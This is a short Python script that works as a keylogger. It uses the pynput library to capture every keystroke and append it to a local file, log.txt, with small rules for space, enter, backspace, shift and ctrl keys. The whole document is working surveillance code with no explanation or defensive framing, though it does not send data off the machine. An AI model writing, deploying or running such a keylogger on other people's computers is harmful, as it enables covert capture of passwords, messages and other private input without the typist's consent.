#!/usr/bin/python3
from pynput.keyboard import Listener
import os
import time

def write_log(key):
	text=str(key)
	text=text.replace("'","")
	#print(text)
	if text== "Key.space":
	   text=" "
	if text== "Key.enter":
	   text="\n"
	if text == "Key.backspace":
	   text=""
	if text == "Key.shift":
	   text=""
	if text.startswith("Key.ctrl"):
	   text="ctrl+"
	#if text.startswith("Key.ctrl"):
	#   text="ctrl+c "
	#if text.startswith("Key.ctrl"):
	#   text="ctrl+a "

	file=open("log.txt","a")
	file.write(text)

with Listener(on_press=write_log) as li:
	li.join()
